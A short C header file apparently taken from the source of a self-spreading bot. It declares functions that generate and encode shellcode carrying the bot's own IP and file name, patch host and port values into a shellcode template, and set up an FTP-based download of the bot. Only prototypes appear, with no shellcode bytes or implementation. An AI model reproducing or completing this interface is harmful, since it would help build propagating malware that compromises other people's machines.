DWORD GetShellcodeSize(char *ownip, char *botfilename);
DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename);
DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0EncodedSize(DWORD shellcodesize);
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize);

typedef bool (*SCCallbackFunc)(char *szShellBuf, int iShellBufSize);
bool contains(char *szBuf, int iSize, char cChar);
int setup_shellcode(char *szOrigShell, int iOrigShellSize, \
					char *szShellBuf, int iShellBufSize, \
					int iPort, int iHost, int iPortOffset, \
					int iHostOffset, SCCallbackFunc pfnSC);
DWORD setup_shellcode_ftp(char *szOrigShell, int iOrigShellSize, \
						char *szShellBuf, int iShellBufSize, \
						char *ownip);
